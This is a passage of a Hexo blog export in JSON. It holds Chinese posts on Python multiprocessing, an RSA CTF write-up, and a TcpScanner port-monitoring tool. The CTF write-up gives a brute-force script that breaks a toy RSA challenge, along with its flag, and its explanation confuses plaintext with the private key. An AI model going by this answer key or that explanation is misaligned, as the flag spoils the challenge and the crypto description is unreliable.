解答：此需求可以稍作修改：所有的子进程都是为了完成一件事情，而当某个子进程完成该事情后，父进程就该结束所有子进程，请问该怎么做？此时结束所有子进程的操作可以交给父进程去做，因为子进程想要结束另外的子进程比较难实现。<br>　　那么问题就又变成了父进程什么时候该结束所有进程？<br>　　其中一个思路是<em>获取每个子进程的返回值</em>，一旦有返回True（结束的标记），则立马结束所有进程；<br>　　另外一种思路是<em>使用共享资源</em>，父进程可以一直去判断这个公共资源，一旦子进程将它改变，则结束所有子进程。（推荐使用前者，因为多进程中不推荐使用资源共享）</p>\n<ul>\n<li><em>子进程中还能再创建子进程吗？</em></li>\n</ul>\n<p>解答：可以，子进程可以再创建进程，线程中也可以创建进程。</p>\n<h4 id=\"（六）多进程资源共享问题\"><a href=\"#（六）多进程资源共享问题\" class=\"headerlink\" title=\"（六）多进程资源共享问题\"></a>（六）多进程资源共享问题</h4><p>多进程中不推荐使用资源共享，如果非要使用，可以参考以下链接。</p>\n<p>具体介绍请参考：<a href=\"http://thief.one/2016/11/24/Multiprocessing共享资源\">多进程资源共享问题</a></p>\n<h4 id=\"（七）获取子进程返回值问题\"><a href=\"#（七）获取子进程返回值问题\" class=\"headerlink\" title=\"（七）获取子进程返回值问题\"></a>（七）获取子进程返回值问题</h4><p>多进程中往往会碰到获取子进程返回值的问题，如果遇到问题可以参考以下链接。</p>\n<p>具体介绍请参考：<a href=\"http://thief.one/2016/11/24/Multiprocessing子进程返回值\">获取子进程返回值问题</a></p>\n<hr>\n\n<p>参考网络文章：</p>\n<p><a href=\"http://www.cnblogs.com/vamei/archive/2012/10/12/2721484.html\" target=\"_blank\" rel=\"external\">http://www.cnblogs.com/vamei/archive/2012/10/12/2721484.html</a><br><a href=\"http://www.cnblogs.com/kaituorensheng/p/4465768.html\" target=\"_blank\" rel=\"external\">http://www.cnblogs.com/kaituorensheng/p/4465768.html</a><br>……<br>太多了，列举不完，排名不分先后。</p>\n","excerpt":"","more":"<p>　　multiprocessing是Python的标准模块，它既可以用来编写多进程，也可以用来编写多线程。如果是多线程的话，用multiprocessing.dummy即可，用法与multiprocessing基本相同，这里主要介绍多进程的用法，欢迎纠错。</p>\n<h4 id=\"（一）Multiprocessing介绍\"><a href=\"#（一）Multiprocessing介绍\" class=\"headerlink\" title=\"（一）Multiprocessing介绍\"></a>（一）Multiprocessing介绍</h4><h5 id=\"为什么要使用python多进程？\"><a href=\"#为什么要使用python多进程？\" class=\"headerlink\" title=\"为什么要使用python多进程？\"></a>为什么要使用python多进程？</h5><p>　　因为python使用全局解释器锁(GIL)，他会将进程中的线程序列化，也就是多核cpu实际上并不能达到并行提高速度的目的，而使用多进程则是不受限的，所以实际应用中都是推荐多进程的。<br>　　如果每个子进程执行需要消耗的时间非常短（执行+1操作等），这不必使用多进程，因为进程的启动关闭也会耗费资源。<br>　　当然使用多进程往往是用来处理CPU密集型（科学计算）的需求，如果是IO密集型（文件读取，爬虫等）则可以使用多线程去处理。</p>\n<h5 id=\"multiprocessing常用组件及功能\"><a href=\"#multiprocessing常用组件及功能\" class=\"headerlink\" title=\"multiprocessing常用组件及功能\"></a>multiprocessing常用组件及功能</h5><p>创建管理进程模块：</p>\n<ul>\n<li><a href=\"http://thief.one/2016/11/24/Multiprocessing-Process\">Process</a>（用于创建进程模块）</li>\n<li><a href=\"http://thief.one/2016/11/24/Multiprocessing-Pool\">Pool</a>（用于创建管理进程池）</li>\n<li>Queue（用于进程通信，资源共享）</li>\n<li>Value，Array（用于进程通信，资源共享）</li>\n<li>Pipe（用于管道通信）</li>\n<li>Manager（用于资源共享）</li>\n</ul>\n<p>同步子进程模块：</p>\n<ul>\n<li>Condition</li>\n<li>Event</li>\n<li>Lock</li>\n<li>RLock</li>\n<li>Semaphore</li>\n</ul>\n<h4 id=\"（二）Multiprocessing进程管理模块\"><a href=\"#（二）Multiprocessing进程管理模块\" class=\"headerlink\" title=\"（二）Multiprocessing进程管理模块\"></a>（二）Multiprocessing进程管理模块</h4><p>说明：由于篇幅有限，模块具体用法结束请参考每个模块的具体链接。</p>\n<h5 id=\"Process模块\"><a href=\"#Process模块\" class=\"headerlink\" title=\"Process模块\"></a>Process模块</h5><p>Process模块用来创建子进程，是Multiprocessing核心模块，使用方式与Threading类似，可以实现多进程的创建，启动，关闭等操作。<br>具体介绍请参考：<a href=\"http://thief.one/2016/11/24/Multiprocessing-Process\">Process模块介绍</a></p>\n<h5 id=\"Pool模块\"><a href=\"#Pool模块\" class=\"headerlink\" title=\"Pool模块\"></a>Pool模块</h5><p>Pool模块是用来创建管理进程池的，当子进程非常多且需要控制子进程数量时可以使用此模块。<br>具体介绍请参考：<a href=\"http://thief.one/2016/11/24/Multiprocessing-Pool\">Pool模块介绍</a></p>\n<h5 id=\"Queue模块\"><a href=\"#Queue模块\" class=\"headerlink\" title=\"Queue模块\"></a>Queue模块</h5><p>Queue模块用来控制进程安全，与线程中的Queue用法一样。</p>\n<h5 id=\"Pipe模块\"><a href=\"#Pipe模块\" class=\"headerlink\" title=\"Pipe模块\"></a>Pipe模块</h5><p>Pipe模块用来管道操作。</p>\n<h5 id=\"Manager模块\"><a href=\"#Manager模块\" class=\"headerlink\" title=\"Manager模块\"></a>Manager模块</h5><p>Manager模块常与Pool模块一起使用，作用是共享资源。</p>\n<h4 id=\"（三）Multiprocessing同步进程模块\"><a href=\"#（三）Multiprocessing同步进程模块\" class=\"headerlink\" title=\"（三）Multiprocessing同步进程模块\"></a>（三）Multiprocessing同步进程模块</h4><h5 id=\"Lock模块\"><a href=\"#Lock模块\" class=\"headerlink\" title=\"Lock模块\"></a>Lock模块</h5><p>作用：当多个进程需要访问共享资源的时候，Lock可以用来避免访问的冲突。</p>\n<p>具体场景：所有的任务在打印的时候都会向同一个标准输出(stdout)输出。这样输出的字符会混合在一起，无法阅读。使用Lock同步，在一个任务输出完成之后，再允许另一个任务输出，可以避免多个任务同时向终端输出。</p>\n<p>代码实现：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">from multiprocessing import Process, Lock  </div><div class=\"line\"></div><div class=\"line\">def l(lock, num):  </div><div class=\"line\">    lock.acquire()  </div><div class=\"line\">    <span class=\"built_in\">print</span> <span class=\"string\">\"Hello Num: %s\"</span> % (num)  </div><div class=\"line\">    lock.release()  </div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:  </div><div class=\"line\">    lock = Lock()  <span class=\"comment\">#这个一定要定义为全局</span></div><div class=\"line\">    <span class=\"keyword\">for</span> num <span class=\"keyword\">in</span> range(20):  </div><div class=\"line\">        Process(target=l, args=(lock, num)).start()  <span class=\"comment\">#这个类似多线程中的threading，但是进程太多了，控制不了。</span></div></pre></td></tr></table></figure></p>\n<h5 id=\"Semaphore模块\"><a href=\"#Semaphore模块\" class=\"headerlink\" title=\"Semaphore模块\"></a>Semaphore模块</h5><p>作用：用来控制对共享资源的访问数量，例如池的最大连接数。</p>\n<h5 id=\"Event模块\"><a href=\"#Event模块\" class=\"headerlink\" title=\"Event模块\"></a>Event模块</h5><p>作用：用来实现进程间同步通信。</p>\n<h4 id=\"（四）Multiprocessing-dummy多线程\"><a href=\"#（四）Multiprocessing-dummy多线程\" class=\"headerlink\" title=\"（四）Multiprocessing.dummy多线程\"></a>（四）Multiprocessing.dummy多线程</h4><p>Multiprocessing.dummy用法与Multiprocessing用法基本相同，只不过是用来创建多线程。</p>\n<h4 id=\"（五）使用Multiprocessing疑问\"><a href=\"#（五）使用Multiprocessing疑问\" class=\"headerlink\" title=\"（五）使用Multiprocessing疑问\"></a>（五）使用Multiprocessing疑问</h4><ul>\n<li><em>启动多进程的代码一定要放在 </em>if <strong>name</strong>==”<strong>main</strong>“:<em> 后面吗？</em></li>\n</ul>\n<p>　　解答：windows系统下，想要启动一个子进程，必须加上<em>if <strong>name</strong>==”<strong>main</strong>“:</em>，linux则不需要。</p>\n<ul>\n<li><em>父进程中的全局变量能被子进程共享吗？</em></li>\n</ul>\n<p>　　解答：不行，因为每个进程享有独立的内存数据，如果想要共享资源，可以使用Manage类，或者Queue等模块。</p>\n<ul>\n<li><em>子进程能结束其他子进程或父进程吗？如果能，怎么通过子进程去结束所有进程?</em></li>\n</ul>\n<p>　　解答：此需求可以稍作修改：所有的子进程都是为了完成一件事情，而当某个子进程完成该事情后，父进程就该结束所有子进程，请问该怎么做？此时结束所有子进程的操作可以交给父进程去做，因为子进程想要结束另外的子进程比较难实现。<br>　　那么问题就又变成了父进程什么时候该结束所有进程？<br>　　其中一个思路是<em>获取每个子进程的返回值</em>，一旦有返回True（结束的标记），则立马结束所有进程；<br>　　另外一种思路是<em>使用共享资源</em>，父进程可以一直去判断这个公共资源，一旦子进程将它改变，则结束所有子进程。（推荐使用前者，因为多进程中不推荐使用资源共享）</p>\n<ul>\n<li><em>子进程中还能再创建子进程吗？</em></li>\n</ul>\n<p>解答：可以，子进程可以再创建进程，线程中也可以创建进程。</p>\n<h4 id=\"（六）多进程资源共享问题\"><a href=\"#（六）多进程资源共享问题\" class=\"headerlink\" title=\"（六）多进程资源共享问题\"></a>（六）多进程资源共享问题</h4><p>多进程中不推荐使用资源共享，如果非要使用，可以参考以下链接。</p>\n<p>具体介绍请参考：<a href=\"http://thief.one/2016/11/24/Multiprocessing共享资源\">多进程资源共享问题</a></p>\n<h4 id=\"（七）获取子进程返回值问题\"><a href=\"#（七）获取子进程返回值问题\" class=\"headerlink\" title=\"（七）获取子进程返回值问题\"></a>（七）获取子进程返回值问题</h4><p>多进程中往往会碰到获取子进程返回值的问题，如果遇到问题可以参考以下链接。</p>\n<p>具体介绍请参考：<a href=\"http://thief.one/2016/11/24/Multiprocessing子进程返回值\">获取子进程返回值问题</a></p>\n<hr>\n\n<p>参考网络文章：</p>\n<p><a href=\"http://www.cnblogs.com/vamei/archive/2012/10/12/2721484.html\">http://www.cnblogs.com/vamei/archive/2012/10/12/2721484.html</a><br><a href=\"http://www.cnblogs.com/kaituorensheng/p/4465768.html\">http://www.cnblogs.com/kaituorensheng/p/4465768.html</a><br>……<br>太多了，列举不完，排名不分先后。</p>\n"},{"title":"RSA加密算法解析","date":"2016-09-05T16:00:00.000Z","comments":1,"_content":"\n　　几个月前参加了一次CTF比赛，其中遇到了RSA加密解密题，当时也是一头雾水，赛后便查找资料整理了一番，在此总结分享。\n<!-- more -->\n#### 算法介绍\n　　RSA加密算法属于公钥加密算法，是一种非对称密码算法，所谓非对称，就是一个密码用来加密，另一个密码用来解密，一般来说，用公钥加密，私钥解密，当然也有其他情况。\n#### 算法原理\n　　RSA算法基于一个事实：将两个大素数相乘十分容易，但是想要对其乘积进行因式分解却极其困难，因此可以将乘积公开作为加密密钥。RSA算法三个参数：n、e1、e2\n\nn=p*q   （p、q为2个大质数） n的二进制所占用的位数即秘钥的长度。\ne1与e2是一对相关的值，e1可以任意取，但要求e1与(p-1)*(q-1)互质；要求(e2*e1)mod((p-1)*(q-1))=1。\n(n,e1),(n,e2)就是密钥对，其中(n,e1)为公钥，(n,e2)为私钥。\n\n#### 算法公式\n\n假设：\nA:明文\nB:密文\n\n------用公钥加密公式------\nA=B^e2 mod n      \nB=A^e1 mod n      \n\n------用私钥加密公式------\nA=B^e1 mod n\nB=A^e2 mod n\n\n\n#### 实战演示\n\n##### 题目概要\n这是一个公钥加密，公钥解密的RSA题目\n给出公钥密码为：{920139713,19}，其中920139713为n，19为e1。\n待解密的密文B为：\n704796792       \n752211152\n274704164\n18414022\n368270835\n483295235\n263072905\n459788476\n483295235\n459788476\n......\n最终求解私钥A的值？\n\n##### 解题思路\n列出公式：公钥加密\n假设：\nA:明文\nB:密文\nA=B^e2 mod n\nB=A^e1 mod n\n\n此题给出了B,n,e1,求A的值，带入公式2即可求解。\n\n##### 编写代码\n```bash\nimport string\nstrs=string.digits+string.lowercase    #列举a-z数字\n\nf=open(\"data.txt\")   #把密文B的内容写进data.txt，方便程序读取\ndata=f.readlines()\nf.close()\n\nplaintext=\"\"\n\nfor b in data:    #取出所有密文(b)\n\tfor a in strs:   #取出所有可能的明文(a)\n\t\tif ord(a)**19 % 920139713==int(b.strip()):         #ord   将字符串转换为ascii码\n\t\t\tplaintext+=a\n\nprint plaintext\n```\n##### 运行结果\n\nflag13212je2ue28fy71w8u87y31r78eu1e2\n\n","source":"_posts/RSA加密算法解析.md","raw":"---\ntitle: RSA加密算法解析\ndate: 2016-09-06\ncomments: true\ntags: 加密算法\ncategories: 技术交流\n---\n\n　　几个月前参加了一次CTF比赛，其中遇到了RSA加密解密题，当时也是一头雾水，赛后便查找资料整理了一番，在此总结分享。\n<!-- more -->\n#### 算法介绍\n　　RSA加密算法属于公钥加密算法，是一种非对称密码算法，所谓非对称，就是一个密码用来加密，另一个密码用来解密，一般来说，用公钥加密，私钥解密，当然也有其他情况。\n#### 算法原理\n　　RSA算法基于一个事实：将两个大素数相乘十分容易，但是想要对其乘积进行因式分解却极其困难，因此可以将乘积公开作为加密密钥。RSA算法三个参数：n、e1、e2\n\nn=p*q   （p、q为2个大质数） n的二进制所占用的位数即秘钥的长度。\ne1与e2是一对相关的值，e1可以任意取，但要求e1与(p-1)*(q-1)互质；要求(e2*e1)mod((p-1)*(q-1))=1。\n(n,e1),(n,e2)就是密钥对，其中(n,e1)为公钥，(n,e2)为私钥。\n\n#### 算法公式\n\n假设：\nA:明文\nB:密文\n\n------用公钥加密公式------\nA=B^e2 mod n      \nB=A^e1 mod n      \n\n------用私钥加密公式------\nA=B^e1 mod n\nB=A^e2 mod n\n\n\n#### 实战演示\n\n##### 题目概要\n这是一个公钥加密，公钥解密的RSA题目\n给出公钥密码为：{920139713,19}，其中920139713为n，19为e1。\n待解密的密文B为：\n704796792       \n752211152\n274704164\n18414022\n368270835\n483295235\n263072905\n459788476\n483295235\n459788476\n......\n最终求解私钥A的值？\n\n##### 解题思路\n列出公式：公钥加密\n假设：\nA:明文\nB:密文\nA=B^e2 mod n\nB=A^e1 mod n\n\n此题给出了B,n,e1,求A的值，带入公式2即可求解。\n\n##### 编写代码\n```bash\nimport string\nstrs=string.digits+string.lowercase    #列举a-z数字\n\nf=open(\"data.txt\")   #把密文B的内容写进data.txt，方便程序读取\ndata=f.readlines()\nf.close()\n\nplaintext=\"\"\n\nfor b in data:    #取出所有密文(b)\n\tfor a in strs:   #取出所有可能的明文(a)\n\t\tif ord(a)**19 % 920139713==int(b.strip()):         #ord   将字符串转换为ascii码\n\t\t\tplaintext+=a\n\nprint plaintext\n```\n##### 运行结果\n\nflag13212je2ue28fy71w8u87y31r78eu1e2\n\n","slug":"RSA加密算法解析","published":1,"updated":"2017-02-14T01:12:03.337Z","layout":"post","photos":[],"link":"","_id":"ciz80dyb5000o3ofvxssmz900","content":"<p>　　几个月前参加了一次CTF比赛，其中遇到了RSA加密解密题，当时也是一头雾水，赛后便查找资料整理了一番，在此总结分享。<br><a id=\"more\"></a></p>\n<h4 id=\"算法介绍\"><a href=\"#算法介绍\" class=\"headerlink\" title=\"算法介绍\"></a>算法介绍</h4><p>　　RSA加密算法属于公钥加密算法，是一种非对称密码算法，所谓非对称，就是一个密码用来加密，另一个密码用来解密，一般来说，用公钥加密，私钥解密，当然也有其他情况。</p>\n<h4 id=\"算法原理\"><a href=\"#算法原理\" class=\"headerlink\" title=\"算法原理\"></a>算法原理</h4><p>　　RSA算法基于一个事实：将两个大素数相乘十分容易，但是想要对其乘积进行因式分解却极其困难，因此可以将乘积公开作为加密密钥。RSA算法三个参数：n、e1、e2</p>\n<p>n=p<em>q   （p、q为2个大质数） n的二进制所占用的位数即秘钥的长度。<br>e1与e2是一对相关的值，e1可以任意取，但要求e1与(p-1)</em>(q-1)互质；要求(e2<em>e1)mod((p-1)</em>(q-1))=1。<br>(n,e1),(n,e2)就是密钥对，其中(n,e1)为公钥，(n,e2)为私钥。</p>\n<h4 id=\"算法公式\"><a href=\"#算法公式\" class=\"headerlink\" title=\"算法公式\"></a>算法公式</h4><p>假设：<br>A:明文<br>B:密文</p>\n<p>——用公钥加密公式——<br>A=B^e2 mod n<br>B=A^e1 mod n      </p>\n<p>——用私钥加密公式——<br>A=B^e1 mod n<br>B=A^e2 mod n</p>\n<h4 id=\"实战演示\"><a href=\"#实战演示\" class=\"headerlink\" title=\"实战演示\"></a>实战演示</h4><h5 id=\"题目概要\"><a href=\"#题目概要\" class=\"headerlink\" title=\"题目概要\"></a>题目概要</h5><p>这是一个公钥加密，公钥解密的RSA题目<br>给出公钥密码为：{920139713,19}，其中920139713为n，19为e1。<br>待解密的密文B为：<br>704796792<br>752211152<br>274704164<br>18414022<br>368270835<br>483295235<br>263072905<br>459788476<br>483295235<br>459788476<br>……<br>最终求解私钥A的值？</p>\n<h5 id=\"解题思路\"><a href=\"#解题思路\" class=\"headerlink\" title=\"解题思路\"></a>解题思路</h5><p>列出公式：公钥加密<br>假设：<br>A:明文<br>B:密文<br>A=B^e2 mod n<br>B=A^e1 mod n</p>\n<p>此题给出了B,n,e1,求A的值，带入公式2即可求解。</p>\n<h5 id=\"编写代码\"><a href=\"#编写代码\" class=\"headerlink\" title=\"编写代码\"></a>编写代码</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div></pre></td><td class=\"code\"><pre><div class=\"line\">import string</div><div class=\"line\">strs=string.digits+string.lowercase    <span class=\"comment\">#列举a-z数字</span></div><div class=\"line\"></div><div class=\"line\">f=open(<span class=\"string\">\"data.txt\"</span>)   <span class=\"comment\">#把密文B的内容写进data.txt，方便程序读取</span></div><div class=\"line\">data=f.readlines()</div><div class=\"line\">f.close()</div><div class=\"line\"></div><div class=\"line\">plaintext=<span class=\"string\">\"\"</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">for</span> b <span class=\"keyword\">in</span> data:    <span class=\"comment\">#取出所有密文(b)</span></div><div class=\"line\">\t<span class=\"keyword\">for</span> a <span class=\"keyword\">in</span> strs:   <span class=\"comment\">#取出所有可能的明文(a)</span></div><div class=\"line\">\t\t<span class=\"keyword\">if</span> ord(a)**19 % 920139713==int(b.strip()):         <span class=\"comment\">#ord   将字符串转换为ascii码</span></div><div class=\"line\">\t\t\tplaintext+=a</div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">print</span> plaintext</div></pre></td></tr></table></figure>\n<h5 id=\"运行结果\"><a href=\"#运行结果\" class=\"headerlink\" title=\"运行结果\"></a>运行结果</h5><p>flag13212je2ue28fy71w8u87y31r78eu1e2</p>\n","excerpt":"<p>　　几个月前参加了一次CTF比赛，其中遇到了RSA加密解密题，当时也是一头雾水，赛后便查找资料整理了一番，在此总结分享。<br>","more":"</p>\n<h4 id=\"算法介绍\"><a href=\"#算法介绍\" class=\"headerlink\" title=\"算法介绍\"></a>算法介绍</h4><p>　　RSA加密算法属于公钥加密算法，是一种非对称密码算法，所谓非对称，就是一个密码用来加密，另一个密码用来解密，一般来说，用公钥加密，私钥解密，当然也有其他情况。</p>\n<h4 id=\"算法原理\"><a href=\"#算法原理\" class=\"headerlink\" title=\"算法原理\"></a>算法原理</h4><p>　　RSA算法基于一个事实：将两个大素数相乘十分容易，但是想要对其乘积进行因式分解却极其困难，因此可以将乘积公开作为加密密钥。RSA算法三个参数：n、e1、e2</p>\n<p>n=p<em>q   （p、q为2个大质数） n的二进制所占用的位数即秘钥的长度。<br>e1与e2是一对相关的值，e1可以任意取，但要求e1与(p-1)</em>(q-1)互质；要求(e2<em>e1)mod((p-1)</em>(q-1))=1。<br>(n,e1),(n,e2)就是密钥对，其中(n,e1)为公钥，(n,e2)为私钥。</p>\n<h4 id=\"算法公式\"><a href=\"#算法公式\" class=\"headerlink\" title=\"算法公式\"></a>算法公式</h4><p>假设：<br>A:明文<br>B:密文</p>\n<p>——用公钥加密公式——<br>A=B^e2 mod n<br>B=A^e1 mod n      </p>\n<p>——用私钥加密公式——<br>A=B^e1 mod n<br>B=A^e2 mod n</p>\n<h4 id=\"实战演示\"><a href=\"#实战演示\" class=\"headerlink\" title=\"实战演示\"></a>实战演示</h4><h5 id=\"题目概要\"><a href=\"#题目概要\" class=\"headerlink\" title=\"题目概要\"></a>题目概要</h5><p>这是一个公钥加密，公钥解密的RSA题目<br>给出公钥密码为：{920139713,19}，其中920139713为n，19为e1。<br>待解密的密文B为：<br>704796792<br>752211152<br>274704164<br>18414022<br>368270835<br>483295235<br>263072905<br>459788476<br>483295235<br>459788476<br>……<br>最终求解私钥A的值？</p>\n<h5 id=\"解题思路\"><a href=\"#解题思路\" class=\"headerlink\" title=\"解题思路\"></a>解题思路</h5><p>列出公式：公钥加密<br>假设：<br>A:明文<br>B:密文<br>A=B^e2 mod n<br>B=A^e1 mod n</p>\n<p>此题给出了B,n,e1,求A的值，带入公式2即可求解。</p>\n<h5 id=\"编写代码\"><a href=\"#编写代码\" class=\"headerlink\" title=\"编写代码\"></a>编写代码</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div></pre></td><td class=\"code\"><pre><div class=\"line\">import string</div><div class=\"line\">strs=string.digits+string.lowercase    <span class=\"comment\">#列举a-z数字</span></div><div class=\"line\"></div><div class=\"line\">f=open(<span class=\"string\">\"data.txt\"</span>)   <span class=\"comment\">#把密文B的内容写进data.txt，方便程序读取</span></div><div class=\"line\">data=f.readlines()</div><div class=\"line\">f.close()</div><div class=\"line\"></div><div class=\"line\">plaintext=<span class=\"string\">\"\"</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">for</span> b <span class=\"keyword\">in</span> data:    <span class=\"comment\">#取出所有密文(b)</span></div><div class=\"line\">\t<span class=\"keyword\">for</span> a <span class=\"keyword\">in</span> strs:   <span class=\"comment\">#取出所有可能的明文(a)</span></div><div class=\"line\">\t\t<span class=\"keyword\">if</span> ord(a)**19 % 920139713==int(b.strip()):         <span class=\"comment\">#ord   将字符串转换为ascii码</span></div><div class=\"line\">\t\t\tplaintext+=a</div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">print</span> plaintext</div></pre></td></tr></table></figure>\n<h5 id=\"运行结果\"><a href=\"#运行结果\" class=\"headerlink\" title=\"运行结果\"></a>运行结果</h5><p>flag13212je2ue28fy71w8u87y31r78eu1e2</p>"},{"title":"TcpScanner端口存活探测","date":"2016-10-14T07:45:20.000Z","comments":1,"_content":"　　TcpScanner是一款探测服务器端口存活性的扫描工具，它基于TCP扫描，图形化界面管理，主要适用对象为服务器运维人员。一般中小型网络环境，其服务器的数量往往要多于网络设备，尤其是有web业务的公司。对于运维人员来说，必须保证业务不能中断（服务器端口服务正常），而网络中服务器数量往往很庞大，怎样及时发现问题很关键。因此，基于先前编写过的一款TCP扫描工具，略做修改，在此分享。\n\n### TcpScanner介绍\n在介绍工具用法前，我先来说说这款工具的具体功能以及优缺点。\n先来一张截图：\n![](/upload_image/20161014/jietu.png)\n背景金刚狼！\n\n#### 功能\n* 检测服务器端口存活性\n* 支持nslookup\n* 邮件告警（1.3版本中已加入）\n\n#### 优点\n* 图形化界面，管理方便使用简单\n* 支持批量服务器端口检测\n* 自定义扫描间隔，自定义结果筛选条件\n\n#### 缺点\n* 目前只支持tcp扫描\n* 没有优化，可能存在一些bug\n\n\n### TcpScanner用法\n#### （1）填写excel\n先准备一张excel表，填写将要检测的服务器名称、ip、端口、域名。\n![](/upload_image/20161014/excel.png)\n严格按照模板填写，否则可能会使结果不准确，*NAME列不要出现重复，如果是同一台服务器，名字可以加以区分。*\n#### （2）加载excel\n运行程序，点击浏览，加载填写完毕的excel文件(最好是.xls文件，xlsx可能会报错)。\n#### （3）检测excel\n点击检测，程序将对excel填写内容进行检测，如无问题则显示*导入excel成功*，如有问题则检查excel填写是否有误。\n#### （4）选择参数\n选择运行间隔、中断筛选参数。\n注：运行间隔表示多久扫描一次（单位：s），中断筛选表示显示中断几次以上的条目（单位：次）。\n#### （5）开始运行\n　　点击开始按钮，此时正常来说程序开始运行了。程序界面上有三个显示框，从右手边开始，第一个显示所有检测的条目，第二个显示出现中断的条目，第三个显示筛选后最终的条目。\n\n　　此时，运维人员便可以通过观察最终显示框中是否存在条目，来判断是否有中断的服务了。当然，如果需要运维人员时时看着程序，工作量也很大，所以在此V1.3版本中增加了邮件通知功能，即出现中断服务通过邮件发送告警通知。\n\n注：*在程序运行后，出现的条目前面有标注数字，这表示此条目中断的次数，如果恢复了，则数字会减小。*\n\n### TcpScanner下载\n（GITHUB源代码下载）：[TcPScannerV1.2](https://github.com/tengzhangchao/TcpScanner)\n（百度网盘下载）：[TcPScannerV1.2](http://pan.baidu.com/s/1hsjYQlI)\n（如果需要1.3版本，可以在博客下方留言）\n\n结语：*工具是在2016.2月编写的，现进行了一些小改动，可能存在bug，如出现错误可留言告知，我会尽快修复，谢谢！*\n\n\n","source":"_posts/TcpScanner端口存活探测.md","raw":"---\ntitle: TcpScanner端口存活探测\ndate: 2016-10-14 15:45:20\ncomments: true\ntags: 扫描器\ncategories: 安全工具\n---\n　　TcpScanner是一款探测服务器端口存活性的扫描工具，它基于TCP扫描，图形化界面管理，主要适用对象为服务器运维人员。一般中小型网络环境，其服务器的数量往往要多于网络设备，尤其是有web业务的公司。对于运维人员来说，必须保证业务不能中断（服务器端口服务正常），而网络中服务器数量往往很庞大，怎样及时发现问题很关键。因此，基于先前编写过的一款TCP扫描工具，略做修改，在此分享。\n\n### TcpScanner介绍\n在介绍工具用法前，我先来说说这款工具的具体功能以及优缺点。\n先来一张截图：\n![](/upload_image/20161014/jietu.png)\n背景金刚狼！\n\n#### 功能\n* 检测服务器端口存活性\n* 支持nslookup\n* 邮件告警（1.3版本中已加入）\n\n#### 优点\n* 图形化界面，管理方便使用简单\n* 支持批量服务器端口检测\n* 自定义扫描间隔，自定义结果筛选条件\n\n#### 缺点\n* 目前只支持tcp扫描\n* 没有优化，可能存在一些bug\n\n\n### TcpScanner用法\n#### （1）填写excel\n先准备一张excel表，填写将要检测的服务器名称、ip、端口、域名。\n![](/upload_image/20161014/excel.png)\n严格按照模板填写，否则可能会使结果不准确，*NAME列不要出现重复，如果是同一台服务器，名字可以加以区分。*\n#### （2）加载excel\n运行程序，点击浏览，加载填写完毕的excel文件(最好是.xls文件，xlsx可能会报错)。\n#### （3）检测excel\n点击检测，程序将对excel填写内容进行检测，如无问题则显示*导入excel成功*，如有问题则检查excel填写是否有误。\n#### （4）选择参数\n选择运行间隔、中断筛选参数。\n注：运行间隔表示多久扫描一次（单位：s），中断筛选表示显示中断几次以上的条目（单位：次）。\n#### （5）开始运行\n　　点击开始按钮，此时正常来说程序开始运行了。程序界面上有三个显示框，从右手边开始，第一个显示所有检测的条目，第二个显示出现中断的条目，第三个显示筛选后最终的条目。\n\n　　此时，运维人员便可以通过观察最终显示框中是否存在条目，来判断是否有中断的服务了。当然，如果需要运维人员时时看着程序，工作量也很大，所以在此V1.3版本中增加了邮件通知功能，即出现中断服务通过邮件发送告警通知。\n\n注：*在程序运行后，出现的条目前面有标注数字，这表示此条目中断的次数，如果恢复了，则数字会减小。*\n\n### TcpScanner下载\n（GITHUB源代码下载）：[TcPScannerV1.2](https://github.com/tengzhangchao/TcpScanner)\n（百度网盘下载）：[TcPScannerV1.2](http://pan.baidu.com/s/1hsjYQlI)\n（如果需要1.3版本，可以在博客下方留言）\n\n结语：*工具是在2016.2月编写的，现进行了一些小改动，可能存在bug，如出现错误可留言告知，我会尽快修复，谢谢！*\n\n\n","slug":"TcpScanner端口存活探测","published":1,"updated":"2017-02-14T01:12:03.337Z","layout":"post","photos":[],"link":"","_id":"ciz80dyb7000q3ofv84nmkyuz","content":"<p>　　TcpScanner是一款探测服务器端口存活性的扫描工具，它基于TCP扫描，图形化界面管理，主要适用对象为服务器运维人员。一般中小型网络环境，其服务器的数量往往要多于网络设备，尤其是有web业务的公司。对于运维人员来说，必须保证业务不能中断（服务器端口服务正常），而网络中服务器数量往往很庞大，怎样及时发现问题很关键。因此，基于先前编写过的一款TCP扫描工具，略做修改，在此分享。</p>\n<h3 id=\"TcpScanner介绍\"><a href=\"#TcpScanner介绍\" class=\"headerlink\" title=\"TcpScanner介绍\"></a>TcpScanner介绍</h3><p>在介绍工具用法前，我先来说说这款工具的具体功能以及优缺点。<br>先来一张截图：<br><img src=\"/upload_image/20161014/jietu.png\" alt=\"\"><br>背景金刚狼！</p>\n<h4 id=\"功能\"><a href=\"#功能\" class=\"headerlink\" title=\"功能\"></a>功能</h4><ul>\n<li>检测服务器端口存活性</li>\n<li>支持nslookup</li>\n<li>邮件告警（1.3版本中已加入）</li>\n</ul>\n<h4 id=\"优点\"><a href=\"#优点\" class=\"headerlink\" 